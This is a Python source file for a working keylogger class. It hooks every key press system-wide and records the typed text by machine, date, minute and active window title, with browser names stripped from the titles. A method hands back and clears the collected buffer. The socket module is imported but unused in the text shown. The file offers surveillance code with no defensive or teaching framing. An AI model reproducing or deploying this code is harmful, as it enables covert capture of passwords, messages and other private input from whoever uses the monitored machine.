import keyboard, socket, re, unicodedata
from datetime import datetime
import pygetwindow as gw


class KeyLogger:
    def __init__(self, machine_name):
        self.machine_name = machine_name
        self.running = True
        self.buffer = {}

    def clean_title(self, title):
        if not title: return "Unknown"
        title = "".join(c for c in title if unicodedata.category(c)[0] != "C")
        title = re.sub(r"^\(\d+\)\s*", "", title)
        return title.replace(" - Microsoft Edge","").replace(" - Google Chrome","").strip()

    def format_key(self, k):
        return {"space":" ", "enter":"\n", "backspace":"<BS>"}.get(k, k)

    def log_event(self, e):
        if not self.running: return
        date = datetime.now().strftime("%Y-%m-%d")
        minute = datetime.now().strftime("%H:%M")
        window = self.clean_title(getattr(gw.getActiveWindow(),"title",""))

        d = self.buffer.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
        self.buffer[self.machine_name][date][minute][window] = d + self.format_key(e.name)

    def get_and_clear_buffer(self):
        data = self.buffer
        self.buffer = {}
        return data

    def stop(self):
        self.running = False

    def start(self):
        keyboard.on_press(self.log_event)
        # keyboard.wait()

# if __name__ == "__main__":
#     keylogger = KeyLogger("keylogger")
#
#     try:
#         keylogger.start()
#     except KeyboardInterrupt:
#         keylogger.stop()
#         print(keylogger.get_and_clear_buffer())
